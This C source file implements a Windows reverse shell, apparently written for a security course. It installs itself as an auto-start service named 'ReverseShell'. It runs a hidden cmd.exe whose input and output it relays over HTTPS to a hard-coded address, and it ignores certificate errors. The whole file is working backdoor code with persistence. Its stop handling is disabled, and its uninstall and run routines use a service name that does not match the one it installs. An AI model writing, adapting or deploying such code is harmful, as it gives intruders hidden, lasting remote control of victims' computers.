#include <windows.h>
#include <tlhelp32.h>
#include <strsafe.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")
// Luồng chính của service
// Xử lý lệnh điều khiển từ SCM
SERVICE_STATUS_HANDLE   g_StatusHandle = NULL;
SERVICE_STATUS          g_ServiceStatus = { 0 };
HANDLE                  g_StopEvent = NULL;

VOID WriteLog(const WCHAR* buffer) {
    SYSTEMTIME st;
    BOOL isWriteSuccess;
    WCHAR logEntry[1024];
    wchar_t logFilePath[MAX_PATH];
    StringCchCopyW(
        logFilePath,
        MAX_PATH,
        L"log.txt"
    );
    //wcscat_s(logFilePath, MAX_PATH, L"log.txt");
    HANDLE hFile = CreateFileW(logFilePath,
        FILE_APPEND_DATA,
        FILE_SHARE_READ,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return;
    GetLocalTime(&st);
    wsprintfW(logEntry, L"[%04d-%02d-%02d %02d:%02d:%02d] %s\r\n",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond,
        buffer);
    isWriteSuccess = WriteFile(
        hFile,
        logEntry,
        lstrlenW(logEntry) * sizeof(WCHAR),
        NULL,
        NULL
    );
    CloseHandle(hFile);
}
BOOL IsInternetAvailable() {
    HINTERNET hInet = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_SECURE_DEFAULTS
    );

    HINTERNET hInet2 = WinHttpConnect(
        hInet,
        L"www.google.com",
        INTERNET_DEFAULT_HTTPS_PORT,
        0
    );
    HINTERNET hInet3 = WinHttpOpenRequest(
        hInet2,
        L"GET",
        L"/",
        L"HTTP/2",
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    BOOL OK = WinHttpSendRequest(
        hInet3,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0L
    );
    BOOL OK2 = WinHttpReceiveResponse(
        hInet3,
        0
    );
    DWORD statusCode;
    DWORD statusCodeLength = sizeof(statusCode);
    BOOL OK3 = WinHttpQueryHeaders(
        hInet3,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &statusCode,
        &statusCodeLength,
        WINHTTP_NO_HEADER_INDEX
    );
    if (hInet) WinHttpCloseHandle(hInet);
    if (hInet2) WinHttpCloseHandle(hInet2);
    if (hInet3) WinHttpCloseHandle(hInet3);
    return statusCode == HTTP_STATUS_OK;
}
VOID StartReverseShell() {
    HANDLE hReadPipe1;
    HANDLE hWritePipe1;
    HANDLE hReadPipe2;
    HANDLE hWritePipe2;
    HINTERNET hInet1;
    HINTERNET hInet2;
    HINTERNET hInet3;
    CHAR data[1024] = { 0 };
    DWORD bytes;
    DWORD statusCode;
    DWORD statusCodeSize = sizeof(statusCode);
    DWORD bytes2;
    CHAR data2[1024] = { 0 };
    DWORD bytes3;
    //connect to remote machine
    hInet1 = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_SECURE_DEFAULTS
    );

    hInet2 = WinHttpConnect(
        hInet1,
        L"192.168.1.152", // L"192.168.1.147""
        INTERNET_DEFAULT_HTTPS_PORT,
        0
    );
    //create no-window shell
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    BOOL OK = CreatePipe(
        &hReadPipe1,
        &hWritePipe1,
        &sa,
        0
    );
    BOOL OK2 = CreatePipe(
        &hReadPipe2,
        &hWritePipe2,
        &sa,
        0
    );

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    si.hStdInput = hReadPipe1;
    si.hStdOutput = hWritePipe2;
    si.hStdError = hWritePipe2;
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    BOOL OK3 = CreateProcessW(
        L"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        TRUE,                  //bInheritHandles
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );
    //loop output to remote machine, receive input from remote machine

    //ignore self-signed certificate
    DWORD dwFlags;
    DWORD dwLength;
    DWORD dwProtocols;
    DWORD dwSendTimeout;

    while (1) {
        Sleep(500);
        hInet3 = WinHttpOpenRequest(
            hInet2,
            L"POST",
            L"/",
            L"HTTP/2",
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE
        );
        WinHttpQueryOption(
            hInet3,
            WINHTTP_OPTION_SECURITY_FLAGS,
            &dwFlags,
            &dwLength
        );
        dwFlags |= SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA;
        WinHttpSetOption(
            hInet3,
            WINHTTP_OPTION_SECURITY_FLAGS,
            &dwFlags,
            sizeof(dwFlags)
        );
        dwProtocols = WINHTTP_PROTOCOL_FLAG_HTTP2;
        WinHttpSetOption(hInet3, WINHTTP_OPTION_ENABLE_HTTP_PROTOCOL, &dwProtocols, sizeof(dwProtocols));
        dwSendTimeout = 600; // 10 giây

        WinHttpSetOption(hInet3, WINHTTP_OPTION_SEND_TIMEOUT, &dwSendTimeout, sizeof(DWORD));

        ReadFile(hReadPipe2, data, 1024, &bytes, NULL);
        WinHttpSendRequest(
            hInet3,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0L,
            data,
            bytes,
            bytes,
            0L
        );

        WinHttpReceiveResponse(
            hInet3,
            0
        );

        WinHttpQueryHeaders(
            hInet3,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX,
            &statusCode,
            &statusCodeSize,
            WINHTTP_NO_HEADER_INDEX
        );
        if (statusCode == HTTP_STATUS_OK) {
            WinHttpQueryDataAvailable(
                hInet3,
                &bytes2
            );
            WinHttpReadData(
                hInet3,
                &data2,
                bytes2,
                &bytes3
            );
            WriteFile(hWritePipe1, data2, bytes3, NULL, NULL);//strlen(cmd)
        }
        WinHttpCloseHandle(hInet3);
    }
    //DWORD err = GetLastError();

}

VOID InstallService()
{
    WriteLog(L"InstallService");
    wchar_t szPath[MAX_PATH];
    // Lấy đường dẫn của file exe hiện tại
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    // Mở SCM
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    // Tạo service
    SC_HANDLE hService = CreateServiceW(
        hSCManager,
        L"Q221.GroupN12.ReverseShell",           // Tên service
        L"Q221.GroupN12.ReverseShell",           // Tên hiển thị
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,                // Tự động khởi động
        SERVICE_ERROR_NORMAL,
        szPath,                            // Đường dẫn file exe
        NULL, NULL, NULL, NULL, NULL);
    SERVICE_DESCRIPTIONW sd;
    sd.lpDescription = (LPWSTR)L"19521268 PhamPhuBinh";
    ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &sd);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
}
VOID UninstallService()
{
    WriteLog(L"UnInstallService");
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    SC_HANDLE hService = OpenServiceW(hSCManager, L"Q21.1.Group0.ReverseShell", DELETE | SERVICE_STOP | SERVICE_QUERY_STATUS);
    SERVICE_STATUS status;
    QueryServiceStatus(hService, &status);
    if (status.dwCurrentState == SERVICE_RUNNING) {
        BOOL OK = ControlService(hService, SERVICE_CONTROL_STOP, &status);
        //Sleep(1000);
        while (QueryServiceStatus(hService, &status)) {
            if (status.dwCurrentState == SERVICE_STOPPED)
                break;
            Sleep(1000);  // Chờ 1 giây rồi kiểm tra lại
        }
    }
    // Dừng service nếu đang chạy
    DeleteService(hService);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
}
VOID RunService() {
    WriteLog(L"RunService");
    // Mở SCM
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    // Tạo service
    SC_HANDLE hService = OpenServiceW(hSCManager, L"Q21.1.Group0.ReverseShell", SERVICE_START);
    StartServiceW(hService, 0, NULL);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
}
void WINAPI ServiceCtrlHandler(DWORD dwCtrl) {
    WriteLog(L"ServiceCtrlHandler");
    switch (dwCtrl) {
        /*
    case SERVICE_CONTROL_STOP:
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        g_ServiceStatus.dwControlsAccepted = 0;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        SetEvent(g_StopEvent);
        WriteLog(L"SERVICE_CONTROL_STOP");
        break;
        */
    case SERVICE_CONTROL_INTERROGATE:
        WriteLog(L"SERVICE_CONTROL_INTERROGAT");
        break;
    default:
        break;
    }
}
void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {
    // Đăng ký handler
    g_StatusHandle = RegisterServiceCtrlHandlerW(L"Q221.GroupN12.ReverseShell", ServiceCtrlHandler);
    // Báo trạng thái START_PENDING
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    //g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    g_ServiceStatus.dwWaitHint = 0;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // Báo trạng thái RUNNING
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    if (IsInternetAvailable()) {
        StartReverseShell();
    }
    // Dọn dẹp và kết thúc
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}


// Hàm kiểm tra kết nối Internet bằng generate_204

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow = 1) {
    SERVICE_TABLE_ENTRYW serviceTable[] = {
    { (LPWSTR)L"Q221.GroupN12.ReverseShell", (LPSERVICE_MAIN_FUNCTIONW)ServiceMain},
    { NULL, NULL }
    };
    if (!StartServiceCtrlDispatcherW(serviceTable)) {

        InstallService();
        // chạy service
        RunService();
        //UninstallService();
    }
    return 0;
}